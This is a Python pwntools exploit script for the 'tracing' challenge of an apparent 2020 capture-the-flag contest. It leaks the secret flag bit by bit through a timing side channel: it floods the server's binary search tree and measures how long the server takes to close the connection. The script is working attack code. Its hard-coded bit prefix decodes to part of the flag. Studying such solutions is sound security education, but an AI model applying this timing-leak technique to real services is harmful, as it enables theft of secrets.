#!/usr/bin/env python
"""Exploit script for tracing challenge."""
import struct
import sys

from pwn import *

context.log_level = 'info'

HOST = 'tracing.2020.ctfcompetition.com'
PORT = 1337

# These are threshold values suitable for my location. You probably need to change these.
THRESHOLD_LOWER = 0.25
THRESHOLD_UPPER = 0.45
THRESHOLD_TIMEOUT = 3

# We wait for this amount of seconds until we start the time measurement and close the socket.
DATA_TRANSFER_DURATION = 15

# We insert this amount of values in the BST
UUID_COUNT = 10000


def exploit(proc, mode, value):
    """Runs the exploit."""
    for i in range(UUID_COUNT):
        proc.send(value + struct.pack('>H', i))

    proc.send('\n')

    log.info('Waiting for data transmission')
    time.sleep(DATA_TRANSFER_DURATION)
    log.info('Shutting down socket in one direction')

    start = time.time()
    proc.shutdown() # Close the socket on the client side

    proc.readall() # Wait for the server to close it
    end = time.time()

    log.info(f'time: {end - start}')
    return end - start


def bin_to_str(binary_data):
    """Decodes and returns the binary data as string."""
    str_data = b''
    for i in range(0, len(binary_data), 8):
        decimal_data = int(binary_data[i:i+8], 2)
        str_data = str_data + (decimal_data).to_bytes(1, byteorder='little')
    return str_data


def format_bin_data(binary_data):
    """Formats the binary data for output."""
    return ' '.join([binary_data[i:i+8] for i in range(0, len(binary_data), 8)])


def loop(host, port, mode, auto=True):
    """Runs the exploit in a loop to leak 1 Bit At A Time."""

    # I started with an empty string here. While working on the script I updated this
    # value such that the search does not begin from zero every time I re-run the script
    start = '01000011' + \
            '01010100' + \
            '01000110' + \
            '01111011' + \
            '00110001' + \
            '01000010' + \
            '01101001' + \
            '01110100' + \
            '01000001' + \
            '01110100' + \
            '01000001' + \
            '01010100'    

    current = start

    while True:
        log.info('Trying to connect ..')
        try:
            proc = remote(host, port)
        except pwnlib.exception.PwnlibException:
            time.sleep(1)
            continue

        value = bin_to_str(current.ljust(8*14, '1'))
        log.info(f'Current value: {value}')
        log.info(f'In binary representation: {format_bin_data(current)}')

        duration = exploit(proc, mode, value)

        if auto:
            if duration < THRESHOLD_LOWER:
                log.info('Appending 0.')
                current += '0'
            elif duration > THRESHOLD_TIMEOUT:
                log.info("This took very long. Let's try again.")
            elif duration > THRESHOLD_UPPER:
                log.info('Removing one bit, appending "10".')
                current = current[:-1] + '10'
            else:
                log.info('Value in grace period. Doing nothing.')

        else:
            while True:
                log.info(f'Current value: {value}')
                log.info(f'In binary representation: {format_bin_data(current)}')

                log.info("Your Choice? Add '1', add '0', 'r'emove a bit, or 'n'one:")
                user_in = input()
                if user_in[0] == '1':
                    log.info('Appending 1')
                    current += '1'
                elif user_in[0] == '0':
                    log.info('Appending 0')
                    current += '0'
                elif user_in[0] in ['r', 'R']:
                    log.info('Removing one byte')
                    current = current[:-1]
                else:
                    log.info('Continuing')
                    break


def main():
    """Does general setup and calls the general loop."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <mode>')
        sys.exit(0)

    mode = sys.argv[1]

    if mode == 'local':
        loop('localhost', 1337, mode, auto=False)
    elif mode == 'remote':
        loop(HOST, PORT, mode)
    else:
        print('Invalid mode')
        sys.exit(1)


if __name__ == '__main__':

    main()
